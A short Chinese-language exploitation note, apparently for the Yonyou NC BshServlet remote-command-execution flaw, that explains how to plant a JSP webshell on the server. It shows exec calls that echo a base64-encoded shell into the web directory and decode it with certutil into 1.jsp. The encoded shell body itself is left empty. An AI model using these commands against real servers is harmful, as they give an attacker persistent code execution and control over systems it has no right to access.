直接写入webshell会将双引号也写入
```
exec(cmd /c echo \">shell<\") >shell.jsp;
```
shell.jsp的内容为
```
">shell<"
```

可先将webshell内容进行base64编码
```
```
再使用echo写入编码后的webshell
```
exec("cmd /c echo(123>webapps/nc_web/1.txt)
```
最后使用certutil解码webshell
```
exec("cmd /c certutil -f -decode webapps/nc_web/1.txt webapps/nc_web/1.jsp")
```

参考链接：  
https://jdr2021.github.io/2022/06/14/用友-NC-bsh-servlet-BshServlet-RCE-利用方法/